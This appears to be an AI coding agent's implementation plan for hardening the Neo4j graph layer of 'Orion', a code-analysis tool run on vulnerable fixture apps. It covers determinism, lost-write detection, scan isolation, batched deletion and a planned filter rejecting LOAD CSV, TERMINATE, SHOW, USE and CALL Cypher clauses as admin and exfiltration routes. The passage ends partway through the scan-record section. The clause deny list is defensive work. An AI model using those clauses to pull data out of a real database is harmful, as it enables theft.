# Graph Hardening Implementation Plan

> **For agentic workers:** executed inline by the planning session (user ruling: "You do all three
> phases yourself… Don't hand work off to subagents"). Steps use checkbox (`- [ ]`) syntax.

**Goal:** make Orion's graph layer repeatable, loud about lost writes, safe to share between
profiles and scans, cheap to clean, re-analysable without Joern, and closed to admin/exfil Cypher
on the Claude MCP path, without moving FLOWS_TO (217 / 1075) or the default scan's output.

**Architecture:** small, local fixes in `graph/` (pathfind, reachability, persist, joern_adapter)
plus one new lifecycle module `orion/graph/scans.py` (scan record, batched delete, gc, `--scan-id`
gate) and one new `orion/graph/reanalyze.py`. CLI gains `gc` and `reanalyze`. The MCP server gains a
clause filter that imports (does not edit) `orion/lm/tools.py`.

**Tech stack:** Python 3.13.12 (.venv), neo4j driver 6.2.0, Neo4j 5.26.28 Community (docker
`orion-neo4j`, 7688/7475), networkx 3.6.1, Joern at `~/joern/joern-cli`, pytest.

**Spec:** the task brief pasted into session 2026-10-18 (changes 1–9 + invariants + phases).

## Global constraints (from the brief)

- Branch `fix/graph-hardening` from `eval/orion-lm` (created). One commit per change. No AI
  attribution (no `Co-Authored-By`, no "Generated with Claude Code"). No push.
- Out of scope: dependency/CVE linking, exposure, anything from Cartography, `train/`, `eval/`.
  `orion/lm/tools.py` may be imported from, never edited.
- Invariants at the end: FLOWS_TO parity 217 (NodeGoat) and 1075 (PyGoat); default `orion scan`
  output unchanged apart from now-deterministic ordering; scan_id isolation; `get_schema` output
  unchanged; no network; every count/time reported is measured.
- Tests: behaviour, not implementation mirrors; never mock the unit under test; graph tests run
  against the real Neo4j with throwaway `test-<uuid>` scan_ids; never delete any other scan.
- Per change: write test → run, paste red → fix → green → `./.venv/bin/pytest -m "not slow" -q` →
  commit.

## Garbled brief: how I read the cut-off lines

The pasted brief lost text in several places. My reading (correct me if wrong):

| Where | Cut text | Read as |
|---|---|---|
| change 4 | "Keep each behaviour on purpose an…" | …and pin each with a test (persist `_clear` spares Chunk; `clear_scan` removes it) |
| change 4 | duplicated "Report the counts… Warn… fail in" | paste duplication of change 2, not a new requirement |
| change 5 | "STOP and report the before a…date the expected count yourself" | STOP and report before/after; do NOT update the expected count yourself |
| change 6 | "filter it out of GraphDB.schema(), so the get_sch…" | …so the `get_schema` output is unchanged |
| change 7 | "`orion reanalyze --scan-id X [--engine lm…`" / "run pathf…ce only the :CandidateFlow nodes" | `[--engine claude\|lm]`; run pathfind and replace only the CandidateFlow nodes |
| change 8 | "verify._SCHEMA_B… actually emitted… (it's…pre-registered)" | `verify._SCHEMA_BLOCK` match what is actually emitted; prompt text is pre-registered |
| change 9 | "…could use to sen…ANSACTIONS`, `SHOW …`" | send data out; also `TERMINATE TRANSACTIONS`, `SHOW …`, `USE`, `CALL` |
| change 9 | "and thise behave the same" / "refused before they reach" | the two paths need not behave the same / before they reach Neo4j |
| tests | "Never mock the thing under tes…ested against the real Neo4j" | never mock the thing under test; graph tests run against the real Neo4j |
| change 1 | "different PYTHONHASHSEED values …low output" | …and compare the flow output |
| out of scope | "train/ and eva… reuse code from tools.py" | train/ and eval/; you may reuse code from tools.py; don't change it |

## Rulings (Krish, 2026-10-18) — these override the options below

- **D1:** cloned `https://github.com/adeyosemanputra/pygoat` → `fixtures/PyGoat`, **pinned commit
  `19d17cc8874861142b330636d068bbde54e86b85`** (2026-03-28, "Fix incorrect route name for
  auth_failure/lab3 (#468) (#469)"); `cpg.bin` from `joern-parse --language pythonsrc` (3.3s,
  1,320,876 bytes). The historical **1075 came from an unknown commit**. Measured on the pinned
  commit with the PRE-change code (`eval/orion-lm` @ `d20173a`, temporary worktree): oracle /
  summaries / legacy envelope / stream envelope = **1075 / 1075 / 1075 / 1075** FLOWS_TO (98
  CandidateFlows, 1523 CpgParameter rows, 9769 deduped nodes). NodeGoat with the same code: 217 /
  217 / 217 / 217 (116 CandidateFlows, 831 CpgParameter rows, 3115 deduped nodes). The pinned
  baseline (1075 @ 19d17cc) goes into a new assertion in `tests/test_stream_build.py` together with
  the SHA; no existing test asserted 1075 (it lived only in CLAUDE.md, a `stream_build.py` comment
  and docs). Invariant = AFTER count on the pinned commit equals this BEFORE count.
- **D2:** `--scan-id` refuses a scan with no record and prints the rebuild command. No fallback.
- **D3:** `reanalyze --engine` must match the recorded profile, else refuse.
- **D4:** accepted only if FLOWS_TO stays 217 and PyGoat before == after; report old/new node
  count, any CandidateFlow change, and how far the discovery timeout moves.
- **D5:** build stage only, CLI settings, `test-<uuid>` scans, no Claude, real NodeGoat scan untouched;
  two-hash-seed comparison on those builds.
- **D6:** gc touches recorded scans by default, has `--prefix` and `--dry-run`, plus
  `--include-unrecorded`, which is refused unless a `--dry-run --include-unrecorded` listing ran
  first: the dry run saves the listed ids to `.orion/gc_unrecorded_plan.json`, and the real run
  deletes only ids from that listing that are still unrecorded (then removes the file). The 38 old
  scans are for Krish to clean; I only dry-run that listing.

## Decisions I needed from you before Phase 2 (answered above)

- **D1 — PyGoat fixture is missing.** `fixtures/` has only `NodeGoat`, `nodejs-goof`, `kubernetes`;
  no PyGoat checkout or `cpg.bin` exists anywhere under `~/Documents` (searched). Every
  1075 test (`test_oracle_parity_pygoat`, `test_stream_envelope_parity_pygoat`, …) SKIPS, so the
  1075 invariant can't be measured. No PyGoat commit is recorded in docs. Options: (a) you
  provide/allow a clone (network) and name the commit; (b) I report 1075 as unverified.
  **Default if you don't say: (b).**
- **D2 — `--scan-id` on scans with no record.** All 38 scans now in Neo4j predate `OrionScan`.
  Recommended: refuse (fail closed, message says to rebuild). Alternative: warn and continue.
- **D3 — `reanalyze --engine`.** Recommended: the engine must agree with the scan's recorded
  profile (refuse otherwise), so a default scan_id never holds lm flows (keeps change 3 true).
  Alternative: `--engine lm` switches the scan's profile and rewrites its record.
- **D4 — change 5 changes a progress number.** NodeGoat's CpgParameter count goes 290 → 831
  (measured below), so `GraphDB.node_count` and the discovery line "discovery fleet starting (N
  nodes, per-shape timeout Ts)" change for default scans (today's NodeGoat node_count: 3291,
  measured). Recommended: accept; that is the bug fix itself.
- **D5 — Phase 3 "one real `orion scan`".** The full `orion scan` runs Claude discovery+verify
  (tokens, non-deterministic LLM output) and would rebuild the real NodeGoat partition
  `272baff…` (deleting another scan). Recommended: run the scan's build stage exactly as the CLI
  calls it (`graph_build.build(stream=True, queue_size=64, on_batch=embed.index)`) into two
  `test-<uuid>` scans under different `PYTHONHASHSEED`s and compare graph rows. Say so if you want
  the full Claude pipeline instead.
- **D6 — gc policy.** Recommended: candidates are scans WITH an `OrionScan` record matching
  `--prefix` (default: all recorded); keep the N newest by `built_at`, delete the rest (any status);
  never touch unrecorded scans; `--dry-run` lists without deleting; `--keep` must be ≥ 1.

**Found while reading, not fixing (flagging):** `tests/test_graph_build.py` is NOT marked slow and
calls `build("fixtures/NodeGoat")`, so every `pytest -m "not slow"` run clears and reloads the real
default NodeGoat partition `272baff…` (my baseline run did this too). Existing tests also use
non-uuid ids (`test-chunk-1`, `parity-legacy`, …). I will not change those tests.

## Baseline (measured 2026-10-18, before any change)

- `./.venv/bin/pytest -m "not slow" -q` → **369 passed, 2 skipped, 41 deselected** (59.86s).
- `./.venv/bin/pytest eval/tests -q` → **190 passed** (1.10s).
- NodeGoat stream envelope: 3570 nodes, 4456 edges, **217 FLOWS_TO** (3.5s).
- NodeGoat precompute: 50/281 methods + 394/2052 calls reachable; centrality over 444 nodes / 827
  edges; pathfind 428 sources → **116 CandidateFlows** (default) / **201** (lm sinks).
- Neo4j: 38 scans, ~1.2M nodes; labels with scan_id: CandidateFlow, Chunk, CpgCall, CpgFile,
  CpgMethod, CpgModule, CpgParameter, CpgReturn, Dependency, EntryPoint (ExploitChunk has none).
- `get_schema` snapshot saved: 64 node rows, 8 rel rows (scratchpad `get_schema_before.json`).

## Order of work

1 → 2 → 3 → 4 → **8** → 5 → 6 → 7 → 9. Change 8's schema test lands before 5 and 6 because those
two are exactly the changes that could drift the prompt schema (a new CpgParameter prop, an
OrionScan label); the guard must exist first. 6 needs 4 (gc uses the batched delete); 7 needs 1
(order-free pathfind), 2 (write counters) and 6 (scan record).

## File map

| File | Change(s) | Responsibility |
|---|---|---|
| `orion/graph/pathfind.py` | 1 | sort sources + FLOWS_TO adjacency before BFS |
| `orion/graph/reachability.py` | 1 | insert centrality graph nodes in sorted order |
| `orion/graph/persist.py` | 2, 4 | write counters, mismatch report/strict; `_clear` → batched per-label delete; scan_id indexes |
| `orion/config.py` | 2 | `persist_strict()` read from `ORION_PERSIST_STRICT` at call time |
| `orion/graph_build.py` | 2, 3, 6, 7 | mismatch warn event; profile-aware `scan_id_for`; scan record writes; precompute try/except |
| `orion/graph/scans.py` (new) | 4, 6 | `SCAN_LABELS`, scan_id indexes, batched delete, `OrionScan` record, `--scan-id` gate, gc |
| `orion/graph/reanalyze.py` (new) | 7 | load a scan's call graph from Neo4j, re-run pathfind, replace CandidateFlows |
| `orion/graphdb.py` | 4, 6 | `clear_scan`/`node_count` per-label; `schema()` filters OrionScan |
| `orion/runtime/writeback.py` | 4 | `CLEAR_PROPS` and `unreachable_executed` per-label (CpgCall, CpgMethod) |
| `orion/graph/joern_adapter.py` | 5 | owning method full_name in the CpgParameter uid |
| `orion/cli.py` | 3, 6, 7 | lm scan_id; `--scan-id` gate; `orion gc`; `orion reanalyze` |
| `orion/mcp_server.py` | 9 | reject LOAD CSV / TERMINATE / SHOW / USE / CALL before GraphDB |
| `tests/conftest.py` (new) | 2 | `ORION_PERSIST_STRICT=1` for the test process and its subprocesses |
| `tests/graph_snapshot.py` (new) | 1, 7, Phase 3 | scan_id-free snapshot rows from a batch or from Neo4j + added/missing diff |
| `tests/golden/nodegoat_{default,lm}.json` (new) | 1 | golden snapshots generated from today's code before the fix |
| `tests/_hashseed_probe.py` (new) | 1 | the subprocess body the determinism tests run under each seed |
| `tests/test_cli_engine.py` (edit stubs only) | 3, 6 | `scan_id_for` stub takes `profile=`; `_stub_env` stubs the scan-record gate |

---

## Change 1 — results differ between runs

**Evidence (run 2026-10-18).**
- Synthetic 20-way tie (20 entry-method calls each `FLOWS_TO` one `eval()` sink), `pathfind` under
  `PYTHONHASHSEED=0..4` picks source `src01`, `src14`, `src00`, `src16`, `src18`: the
  CandidateFlow's `source_uid`, `path_uids` and `uid` change with the seed. Cause: `pathfind.py:130`
  iterates the `sources` set of str uids.
- Synthetic 2601-node reachable tree (above `_CENTRALITY_EXACT_MAX` = 2000): `max_centrality` under
  seeds 0..4 = 0.001573, 0.000196, 0.000392, 0.000786, 0.001999 (5 different digests). Cause:
  `reachability.py:182` adds nodes in set order and networkx samples k=500 pivots from that order;
  `seed=1` only fixes the RNG, not the population order.
- Real NodeGoat batch: the 116 default / 201 lm CandidateFlows (rank, source, sink, full path) were
  identical across 16 seeds (no tie occurs there), but the persisted `centrality` differs: seeds
  0 vs 3 and 0 vs 11 differ on 6 of 2052 CpgCall values (max |Δ| 3.388e-21); 9 distinct
  centrality digests over 16 seeds. Even exact betweenness sums floats in node order.
- Other order dependence checked:
  - `taint_summary` / `collapse_flows` sets hold int Joern ids or int tuples (hash not seeded).
    The NodeGoat envelope's edge/node/entry order digests were identical across seeds 0..5. No fix.
  - `tag_reachability` BFS (`reachability.py:107`) iterates a set, but min hop distance doesn't
    depend on visit order. No fix.
  - `_classify_sink` iterates `profile.sink_hints`, an insertion-ordered dict (deterministic). An
    equal-severity tie goes to the first-declared category; changing that would change default
    output. No fix; noted.
  - NEW: `pathfind` also depends on FLOWS_TO **edge order** (BFS parent = first-listed neighbour).
    Within one build that's fixed, but `reanalyze` (change 7) reads edges back in Neo4j storage
    order. Shuffling NodeGoat's edges changed 0 of 116/201 flows today (no equal-length
    alternatives there), and sorting the adjacency changed 0 rows. So the fix is safe.

**Fix.** `pathfind.py:130` `for s in sorted(sources)`; sort each `flows[src]` adjacency list in
`_index_and_edges`; `reachability.py:182` `g.add_nodes_from(sorted(reachable))`.

**Invariant risk.** FLOWS_TO: none (pathfind and centrality read FLOWS_TO, they don't build it).
Default output: CandidateFlow choice can change only where ties exist. NodeGoat has none (the golden
snapshot guards this), and centrality floats can move in the last bits. That is the intended
"now-deterministic ordering". get_schema / isolation / network: none.

**Tests.**

- **T1.1 `tests/test_determinism.py::test_tied_sources_pick_the_same_flow_under_any_hash_seed`**
  (not slow). Runs `tests/_hashseed_probe.py tie` in 5 subprocesses (`PYTHONHASHSEED=0..4`). Each
  builds the 20-source tie batch, runs reachability → centrality → pathfind and prints the
  CandidateFlow rows as JSON. Asserts all 5 outputs are equal.
  - Proves: the chosen source/path/uid for tied sources doesn't depend on the interpreter's hash
    seed.
  - Catches: `pathfind.py:130`.
  - Fails today: `AssertionError: CandidateFlow rows differ: PYTHONHASHSEED=0 picked src01,
    PYTHONHASHSEED=1 picked src14` (values measured above).
  - Doesn't cover: ties on real repos; which source is the *right* one (only that it's stable).
- **T1.2 `…::test_sampled_centrality_is_the_same_under_any_hash_seed`** (not slow). Same harness,
  `big` case (2601 nodes). Asserts per-call centrality values are equal across seeds 0..4.
  - Proves: the k=500 sampled betweenness is reproducible.
  - Catches: `reachability.py:182`.
  - Fails today: `AssertionError: centrality differs: seed0 max 0.0015729… vs seed1 max
    0.0001958…`.
  - Doesn't cover: whether k=500 is a good approximation.
- **T1.3 `…::test_pathfind_ignores_flows_to_edge_order`** (not slow, in-process). Diamond
  `src→a→sink`, `src→b→sink`. Runs pathfind on the batch with edges in two orders and asserts
  identical CandidateFlow rows.
  - Proves: the path chosen among equal-length paths doesn't depend on edge listing order (the
    property reanalyze needs).
  - Catches: `pathfind.py:90` adjacency order (feeds the BFS at :138).
  - Fails today: `AssertionError: ['src','b','sink'] != ['src','a','sink']`. I'll confirm the red
    in Phase 2; if it passes today I'll rewrite it.
  - Doesn't cover: reachability edge order (distances don't depend on it).
- **T1.4 `…::test_nodegoat_rows_equal_under_two_hash_seeds`** (slow; Joern). Two subprocesses
  (`PYTHONHASHSEED=0` and `3`, measured to differ today) each build the NodeGoat stream envelope →
  normalize → precompute. Each prints the scan_id-free snapshot plus per-call `(file, line, code)
  → centrality`. Asserts equal and prints an added/missing diff.
  - Proves: a real build is row-for-row repeatable across seeds, including persisted centrality.
  - Catches: `reachability.py:182` on real data.
  - Fails today: `AssertionError: centrality differs on 6 calls` (6 measured).
  - Doesn't cover: the Neo4j write (Phase 3 does it end-to-end).
- **T1.5 `tests/test_graph_snapshot.py::test_nodegoat_snapshot_matches_golden[default|lm|pygoat-*]`**
  (slow). A **guard, not a red test**: golden files are written from today's code before the fix.
  Snapshot rows: FLOWS_TO `(src file, line, code, dst file, line, code, arg_index)` and CandidateFlow
  `(sink file:line, category, rank, path as [file:line:code…])`, compared as multisets. On mismatch
  the failure lists `added:` and `missing:` rows.
  - Proves: changes 1, 5 and 7 don't move any FLOWS_TO or CandidateFlow row on NodeGoat.
  - Catches: any future regression in `taint_summary`/`pathfind`/`normalize`.
  - Fails today: n/a (guard). I'll show the diff output works by running the default golden against
    the lm profile once (201 vs 116 flows, so it must list added and missing rows; the counts get
    reported as measured).
  - Doesn't cover: PyGoat (skips, D1); centrality values.

## Change 2 — missing edges are silent

**Evidence.** Persisted a 2-node batch with 2 FLOWS_TO edges, one pointing at a missing node, into
`test-4db80820…`. `persist.persist` returned `{'nodes': 2, 'edges': 2}`; Neo4j held
`{'FLOWS_TO': 1}`; no exception, no warning. Cause: `persist.py:152-153` discards `tx.run(...)`;
the `MATCH…MATCH…CREATE` at :74-77 matches zero rows. On the real NodeGoat batch (deduped 3115
nodes, 4480 edge rows) expected == written for every label and type today (e.g. FLOWS_TO 217/217),
so the gap is latent, not active, on NodeGoat.

**Fix.** `_run_write` returns `result.consume().counters`. Jobs carry a key (`("node", label)` /
`("edge", rtype)`). `persist()` sums `nodes_created` / `relationships_created` per key and compares
them with the deduped row counts from `_node_rows` / `_edge_rows`. The summary gains
`counts = {"nodes": {L: {"expected", "written"}}, "edges": {T: {...}}}` and
`mismatches = ["FLOWS_TO: expected 2, written 1", …]` (more-than-expected is also a mismatch:
duplicate keys). `persist(batch, *, strict=None)`: when `strict` (default
`config.persist_strict()`, env `ORION_PERSIST_STRICT`, read per call), any mismatch raises
`persist.PersistMismatch(RuntimeError)` after all jobs finish. Otherwise
`graph_build._persist_warning(summary)` returns a `build`/`warn` event that `build()` emits. No
event when counts match, so the default scan's progress log is unchanged. `tests/conftest.py` sets
`ORION_PERSIST_STRICT=1`. `_node_jobs`/`_edge_jobs` keep their `(cypher, rows)` shape
(`test_persist_chunked` uses it).

**Invariant risk.** FLOWS_TO: none (read-only counters). Default output: unchanged when counts match
(they do on NodeGoat). Strict in tests: an existing test whose batch really loses an edge would now
fail. That's the point; I'll report any that do.

**Tests** (`tests/test_persist_counts.py`, live Neo4j, `test-<uuid>`, cleaned in `finally` by
deleting exactly that id).

- **T2.1 `test_lost_edge_is_counted_in_the_summary`** (strict off). Asserts
  `summary["counts"]["edges"]["FLOWS_TO"] == {"expected": 2, "written": 1}` and a mismatch naming
  FLOWS_TO.
  - Proves: persist reports what it really wrote.
  - Catches: `persist.py:152-153`, `:74-77`.
  - Fails today: `KeyError: 'counts'`.
  - Doesn't cover: *why* an endpoint is missing.
- **T2.2 `test_lost_edge_fails_in_strict_mode`**. `monkeypatch.setenv("ORION_PERSIST_STRICT","1")`,
  `pytest.raises(RuntimeError, match="FLOWS_TO: expected 2, written 1")`.
  - Proves: tests can't silently lose edges.
  - Catches: the same lines.
  - Fails today: `Failed: DID NOT RAISE <class 'RuntimeError'>`.
  - Doesn't cover: rollback (the partial write stays; change 6 leaves the scan `building`).
- **T2.3 `test_build_warns_on_a_lost_edge`**. Feeds the real summary from T2.1 to
  `graph_build._persist_warning` and asserts a `build`/`warn` event whose detail names FLOWS_TO;
  `None` for a clean summary.
  - Proves: normal runs surface the mismatch in progress.jsonl.
  - Catches: no warn path in `graph_build.py:184-197`.
  - Fails today: `AttributeError: module 'orion.graph_build' has no attribute '_persist_warning'`.
  - Doesn't cover: `build()` calling it (T6.1 runs a real build).
- **T2.4 `test_nodegoat_persists_every_row`** (slow). NodeGoat stream batch → `test-<uuid>`. Asserts
  no mismatches and FLOWS_TO written == 217.
  - Proves: zero loss on a real graph.
  - Catches: regressions in endpoint keys.
  - Fails today: `KeyError: 'counts'`.
  - Doesn't cover: PyGoat (D1).

## Change 3 — default and lm scans of one commit overwrite each other

**Evidence.** `graph_build.scan_id_for(repo_path)` (`graph_build.py:78-81`) hashes only
`abspath|commit`, and `cli.py:98` calls it the same way for both engines. Yet `with_lm_sinks`
changes the batch: NodeGoat gets 116 CandidateFlows (default) vs 201 (lm), measured. So an lm build
clears and reloads the default partition with lm flows, and back.

**Fix.** `scan_id_for(repo_path, profile=None)`: `None`, or a profile whose name equals
`select_profile(repo).name`, returns today's exact `sha1(f"{abspath}|{commit}")`. Any other
profile returns `sha1(f"{abspath}|{commit}|{profile.name}")` (e.g. `express+lm`). `build()` passes
its explicit `profile`. `cli.py:98` passes `profile=lm_profile` only on the lm path (same
`**kwargs` pattern as the existing `build_kwargs`), so the claude-path call is byte-identical.

**Invariant risk.** Default scan_id: pinned by T3.1. Existing lm scans built before this change keep
the old (shared) id; nothing migrates them (they also lack a record, D2). Isolation: improved.

**Tests.**

- **T3.1 `tests/test_scan_id_profile.py::test_default_scan_id_formula_is_unchanged`** (not slow).
  Non-git tmp dir. Asserts `scan_id_for(d) == sha1(f"{abspath}|nocommit")` and
  `scan_id_for(d, profile=select_profile(d)) == scan_id_for(d)`.
  - Proves: the default id stays exactly as today.
  - Catches: an accidental formula change.
  - Fails today: `TypeError: scan_id_for() got an unexpected keyword argument 'profile'` (second
    assert).
  - Doesn't cover: git repos (`_commit_sha` is untouched).
- **T3.2 `…::test_lm_profile_gets_its_own_scan_id`**. Asserts
  `scan_id_for(d, profile=with_lm_sinks(select_profile(d))) != scan_id_for(d)`.
  - Catches: `graph_build.py:78-81`.
  - Fails today: same `TypeError`.
- **T3.3 `…::test_cli_prints_different_scan_ids_per_engine`** (not slow; build/discovery stubbed,
  real `scan_id_for`). `cli.main(["scan", repo, "--quiet"])` vs `[..., "--engine", "lm", "--model",
  "/m/x"]`. Asserts the printed `scan_id:` lines differ and the claude one equals T3.1's formula.
  - Catches: `cli.py:98`.
  - Fails today: `AssertionError: same scan_id for both engines`.
  - Doesn't cover: Neo4j.
- **T3.4 `…::test_lm_build_leaves_the_default_partition_alone`** (slow; Joern + Neo4j). Tmp copy of
  NodeGoat's `cpg.bin` + `package.json` (the `test_graph_build` pattern, so the real NodeGoat
  partition is never touched). Builds default, records its CandidateFlow count, builds lm, then
  asserts both partitions exist and the default count is unchanged. Cleanup deletes exactly those
  two derived ids (they derive from a fresh tmp path, so they're throwaway even though they aren't
  `test-` prefixed; the bug lives in the derived id, so a `test-<uuid>` override would bypass it).
  - Proves: no clobbering, end to end.
  - Fails today: `AssertionError: default partition now has 201 CandidateFlows, expected 116` (lm
    count measured on the same graph).
  - Doesn't cover: `--scan-id` profile checks (T6.3).

## Change 4 — scan deletion is unbatched

**Evidence (EXPLAIN on the live DB).** `persist._clear` (`persist.py:139-141`), `clear_scan`
(`graphdb.py:115`), `node_count` (`graphdb.py:103-105`) and `CLEAR_PROPS` (`writeback.py:23`) all
plan as `AllNodesScan` + `Filter n.scan_id = $sid`, over ~1.2M nodes. A per-label
`MATCH (n:CpgCall {scan_id:$sid}) WITH n LIMIT 10000 DETACH DELETE n` plans as
`NodeByLabelScan` + `Filter`: the composite `(scan_id, uid)` NODE_KEY range indexes are **not**
used for a scan_id-only lookup. `Chunk` has no scan_id index at all. The label-less count over
NodeGoat took 0.37s. Same anti-pattern, not in the brief's list: `writeback.unreachable_executed`
(`writeback.py:55`) and `embed.py:319` (labeled, unindexed Chunk delete). I'll fix the first (same
file as `CLEAR_PROPS`) and leave embed alone (it gets faster from the new Chunk index).

**Fix.** `scans.py`:
- `SCAN_LABELS = (*NODE_KEY, "Chunk", "OrionScan")`.
- `ensure_scan_indexes(session)`: `CREATE RANGE INDEX orion_scanid_<L> IF NOT EXISTS FOR (n:L) ON
  (n.scan_id)` + awaitIndex, for every label in `SCAN_LABELS`. Called from
  `persist._ensure_indexes` and before any delete.
- `delete_scan(driver, scan_id, labels, batch=10000) -> dict[label, int]`: per label, repeat
  `MATCH (n:L {scan_id:$sid}) WITH n LIMIT $batch DETACH DELETE n RETURN count(*)` (own write tx
  each) until 0.

Labels by caller, kept different on purpose:
- `persist._clear`: `NODE_KEY` only (spares Chunk, so embed can run concurrently; spares OrionScan,
  so the record survives its own rebuild).
- `GraphDB.clear_scan` and gc: all of `SCAN_LABELS` ("everything for this scan", as today's
  label-less delete, now also the record).

`node_count` sums per-label counts over `NODE_KEY + Chunk`, the same set today's label-less count
saw (OrionScan excluded, so the number doesn't move). `CLEAR_PROPS` becomes a per-label (CpgCall,
CpgMethod) batched `REMOVE` template that keeps the string constant the vocabulary test checks.

**Invariant risk.** Isolation: per-label + scan_id equality, same predicate as today. FLOWS_TO
parity holds through a writeback + clear cycle (the CLAUDE.md claim stays: no NODE_KEY node is
deleted by writeback). get_schema: indexes don't appear in `db.schema.*`. Hazard: a future label
carrying scan_id would be missed by the per-label delete. T4.3 checks that no label outside
`SCAN_LABELS` carries the scan_id after a full build.

**Tests** (`tests/test_scan_delete.py`, live, `test-<uuid>-a/-b`).

- **T4.1 `test_scan_lookups_use_a_scan_id_index`**. For every label in `SCAN_LABELS`, EXPLAIN the
  delete-batch, count and `CLEAR_PROPS` statements the code runs (module constants) and assert the
  plan has `NodeIndexSeek` and no `AllNodesScan` / `NodeByLabelScan`.
  - Proves: deletes/counts touch only the scan's own nodes.
  - Catches: the four sites above + the missing index.
  - Fails today: `AssertionError: CLEAR_PROPS plans AllNodesScan`. After adding the per-label
    statements but before the index, `…CpgCall plans NodeByLabelScan` (the measured plan). That
    gives two genuine reds.
  - Doesn't cover: wall-clock time.
- **T4.2 `test_clear_scan_removes_everything_and_spares_the_neighbour`** (guard). Scans a and b each
  get CpgCall/CpgMethod + CONTAINS_CALL + a Chunk + an OrionScan node. `clear_scan(a)` → a label-less
  test query finds 0 nodes for a; b is intact.
  - Proves: the kept behaviour + isolation.
  - Fails today: n/a. Today's label-less delete also passes; this pins the behaviour across the
    rewrite.
  - Doesn't cover: concurrent writers.
- **T4.3 `test_persist_clear_spares_chunk_and_scan_record`** (guard). After `persist._clear(b)`, b's
  NODE_KEY nodes are gone; its Chunk and OrionScan remain; no label outside `SCAN_LABELS` holds b.
  - Proves: the deliberate difference from T4.2.
  - Fails today: n/a (guard).
- **T4.4 `test_delete_reports_counts_across_many_batches`**. 25,000 CpgCall + 24,999 FLOWS_TO in
  scan a. `delete_scan(...)` returns `{"CpgCall": 25000, …}` and leaves 0 nodes and 0 relationships.
  - Proves: the loop runs to completion past the 10,000 batch and reports what it removed.
  - Catches: unreported, single-tx deletion.
  - Fails today: `AttributeError: module 'orion.graph' has no attribute 'scans'`. Only an API-shape
    red: the old code also deletes them all.
  - Doesn't cover: per-tx memory (not observable without changing server config).
- **T4.5 `test_node_count_is_unchanged`** (guard). For a scan with graph nodes + Chunks + an
  OrionScan record, `node_count` equals a label-less count that excludes OrionScan.
- Existing `test_runtime_wiring::test_writeback_never_deletes_nodes_or_nodekey_labels` must stay
  green unedited.

## Change 8 — schema check (test only) — lands before 5 and 6

**Evidence.** Parsed every `(:Label {props})` and `(:A)-[:T {props}]->(:B)` in `strategies.SCHEMA`
and `verify._SCHEMA_BLOCK` and compared them with the real NodeGoat batch (normalize + deps +
precompute). The label set equals `NODE_KEY` (9 labels); every label's prop set matches exactly.
The only difference: `OBSERVED_CALL {hits}` is described but not in the static batch. It's
runtime-only by design (written by `writeback.CREATE_EDGES`, and the prompt says "only present
after a --runtime scan"). **No drift today.**

**Fix.** None (test only; prompt text is pre-registered and won't be edited).

**Tests.**

- **T8.1 `tests/test_schema_contract.py::test_prompt_schema_matches_emitted_batch`** (slow; NodeGoat
  stream batch). Asserts: emitted labels == NODE_KEY == prompt labels (both blocks); per-label
  emitted props == prompt props; NODE_KEY key props ⊆ props; emitted edge types (with endpoint labels
  and non-scan_id props) == prompt edges minus a single named runtime-only allowance
  `OBSERVED_CALL`, which must appear in `writeback.CREATE_EDGES`.
  - Proves: prompts describe what the graph actually holds.
  - Catches: drift from 5 (a new CpgParameter prop) or 6 (OrionScan leaking into NODE_KEY).
  - Fails today: **it passes today**. That's expected for a test-only guard with no bug behind it.
    I'll show it can go red by temporarily adding a prop to CpgParameter in a scratch copy (expected
    `AssertionError: CpgParameter emitted only ['method_full_name']`), then revert. Nothing
    committed.
  - Doesn't cover: prose claims (e.g. "reliable"); the PyGoat batch (D1).

## Change 5 — CpgParameter uids collide across files

**Evidence.** `joern_adapter.py:450`: `synthesize_uid(scan_id, "METHOD_PARAMETER_IN", "<param>",
line, 0, name)`. NodeGoat: **831** METHOD_PARAMETER_IN vertices in the envelope collapse to **290**
distinct uids (**541 merged away**). Worst keys: `(0,'p1')` × 139, `(0,'p2')` × 117, `(0,'p0')` ×
114, `(1,'this')` × 25. The envelope carries no file or method on params, so the fix needs the AST
`METHOD→METHOD_PARAMETER_IN` edge. Both legacy `project_graphson` and the stream `_structural` (which
calls `project_graphson` per segment, where that edge lives) see it.

**Fix.** `project_graphson` stamps each METHOD_PARAMETER_IN envelope node with its owning METHOD's
`FULL_NAME` (`props["method_full_name"]`, envelope-only, like CALL's `file_path`). `normalize` uses
it in place of `"<param>"` (falling back to `"<param>"` if absent). Not persisted as a property:
keeps get_schema and the prompt schema unchanged (T8.1).

**Invariant risk.** FLOWS_TO: params carry no edges and taint is computed before normalize, so
expected unchanged. **If T5.2 or `test_stream_flows_parity` shows anything but 217, I stop and report
before/after without touching the expected count.** Default output: CpgParameter nodes 290 → 831 on
NodeGoat (D4). Stream/legacy parity: both paths get the same stamp; the existing slow parity tests
must stay green.

**Tests.**

- **T5.1 `tests/test_param_uid.py::test_same_name_same_line_in_two_files_are_two_parameters`** (not
  slow). Minimal GraphSON: two FILEs, two METHODs (`a.js::h`, `b.js::h`), each with param `req` on
  line 1 (AST edges). Runs `project_graphson` → `normalize` → `persist._node_rows`. Asserts 2
  CpgParameter rows with different uids.
  - Proves: parameters of different methods never merge.
  - Catches: `joern_adapter.py:450`.
  - Fails today: `assert 1 == 2`.
  - Doesn't cover: params Joern emits with no AST parent (fallback path).
- **T5.2 `…::test_nodegoat_keeps_every_parameter`** (slow; Joern). Asserts distinct CpgParameter uids
  == METHOD_PARAMETER_IN vertices (831 measured) and FLOWS_TO == 217.
  - Fails today: `assert 290 == 831`.
  - Doesn't cover: PyGoat (D1).

## Change 6 — scan record, `--scan-id` gate, gc

**Evidence.** No `OrionScan` (or any record) label exists (inventory above). `cli.py:97-98` takes
any `--scan-id` with no check. `persist` docstring (`persist.py:214-218`) admits a crashed partition
can be queried via `--scan-id`. `orion --help` lists only `scan` and `index-exploits` (no gc).

**Fix (`scans.py`, `graph_build.py`, `graphdb.py`, `cli.py`).**
- `(:OrionScan {scan_id, commit, profile, orion_version, status, built_at, counts})`.
  - `counts` is a JSON string: Neo4j properties can't hold maps. Same convention as `path_uids`.
  - `orion_version` = `orion.__version__`.
  - `built_at` = UTC ISO-8601.
- `build()` calls `scans.mark_building(...)` before `persist.persist` (whose first write is the
  clear), and `scans.mark_complete(scan_id, counts)` after persist returns. counts = persist counts +
  precompute summaries/errors. A crash leaves `building`.
- `scans.check_usable(scan_id, engine, repo) -> str | None`. `cli` refuses with rc 2 and the message
  when there is no record (D2), the status isn't `complete`, or the profile is wrong:
  - lm: needs `with_lm_sinks(select_profile(repo)).name`.
  - claude with repo: needs `select_profile(repo).name`.
  - claude without repo: needs a profile without `+lm`.

